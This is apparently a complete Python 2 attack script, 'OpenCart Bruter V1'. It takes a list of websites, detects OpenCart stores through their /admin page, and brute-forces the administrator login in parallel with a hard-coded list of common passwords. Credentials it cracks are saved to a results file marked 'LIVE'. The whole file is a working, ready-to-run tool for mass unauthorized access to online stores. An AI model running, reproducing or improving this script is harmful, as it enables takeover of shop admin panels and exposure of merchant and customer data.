import cookielib
import os
import random
import re
import requests
import sys
import time
import urllib
import urllib2
from multiprocessing.dummy import *

from colorama import *

la7mar = '\033[91m'
lazra9 = '\033[94m'
la5dhar = '\033[92m'
movv = '\033[95m'
lasfar = '\033[93m'
ramadi = '\033[90m'
blid = '\033[1m'
star = '\033[4m'
bigas = '\033[07m'
bigbbs = '\033[27m'
hell = '\033[05m'
saker = '\033[25m'
labyadh = '\033[00m'
cyan = '\033[0;96m'
init()

if not os.path.exists("CMS"):
    os.mkdir("CMS", 0755)
class JavaGhost:
    def __init__(self):
            clear = "\x1b[0m"
            colors = [31, 32, 33, 34, 35, 36, 37, 38, 39]
            x = """

  /$$$$$$                                       /$$$$$$                        /$$    
 /$$__  $$                                     /$$__  $$                      | $$    
| $$  \ $$  /$$$$$$   /$$$$$$  /$$$$$$$       | $$  \__/  /$$$$$$   /$$$$$$  /$$$$$$  
| $$  | $$ /$$__  $$ /$$__  $$| $$__  $$      | $$       |____  $$ /$$__  $$|_  $$_/  
| $$  | $$| $$  \ $$| $$$$$$$$| $$  \ $$      | $$        /$$$$$$$| $$  \__/  | $$    
| $$  | $$| $$  | $$| $$_____/| $$  | $$      | $$    $$ /$$__  $$| $$        | $$ /$$
|  $$$$$$/| $$$$$$$/|  $$$$$$$| $$  | $$      |  $$$$$$/|  $$$$$$$| $$        |  $$$$/
 \______/ | $$____/  \_______/|__/  |__/       \______/  \_______/|__/         \___/  
          | $$                                                                        
          | $$                                                                        
          |__/                                                                        
  
  
                  Code By Mr 008 TN ;)
                   OpenCart Bruter V1
    """
            for N, line in enumerate(x.split("\n")):
                sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
                time.sleep(0.05)


            list = raw_input(' ==> Your Fucking List : ')
            url = open(list, 'r').readlines()
            ThreadPool = Pool(25)
            ThreadPool.map(self.CMS, url)

    def CMS(self, url):
        try:
            url = url.replace('\n', '').replace('\r', '')
            op = requests.get(url+'/admin',timeout=7)
            if "dashboard" in op.text:
                print "[+] Opencart", url + labyadh + '\n'
                open("CMS/OpenCart.txt", "a").write(url + '\n')
                self.opencart(url)
            else:
                print '[-] CMS Not Found =>' + url + '\n'

        except:
            print

    def opencart(self,url):
        try:
            cr = open('Result/Result.txt', 'a')
            passlist = ["123", "demo", "admin", "opencart", "123456", "pass", "password", "admin123", "12345", "admin@123", "123", "test",
                        "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                        "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234",
                        "logitech",
                        "p@ssw0rd", "login", "test123", "root", "pass123", "password1", "qwerty", "111111", "gimboroot"]
            for passwordx in passlist:
                passwd = passwordx.strip()
                # print passwd
                cookies = {
                    'OCSESSID': '41793cc49288925a72df1b7b5c',
                    'language': 'en-gb',
                    'currency': 'IDR',
                }

                data = {
                    'username': 'admin',
                    'password': passwd
                }
                r = requests.get(url + "/admin/index.php",timeout=7)
                if "https://" in r.url:
                    url = url.replace("http://", "https://")
                else:
                    pass
                s = requests.Session()
                r = s.post(url + '/admin/index.php', cookies=cookies, data=data,timeout=7)

                if 'common/logout' in r.text:
                    print lasfar + '-----------------------------------------OpenCart-----------------------------------------' + labyadh + '\n'
                    print lazra9 + '[+] Cracked Succsess OpenCart => ' + url + '|admin|' + passwd + labyadh + '\n'
                    print lasfar + '------------------------------------------------------------------------------------------' + labyadh + '\n '
                    cr.write(url + '/admin|admin|' + passwd + ' [#] LIVE \n')
                    break
                else:
                    print '[-] Failed  OpenCart => ' + url + '|admin|' + passwd + labyadh + '\n'
            return 0
        except:
            pass

JavaGhost()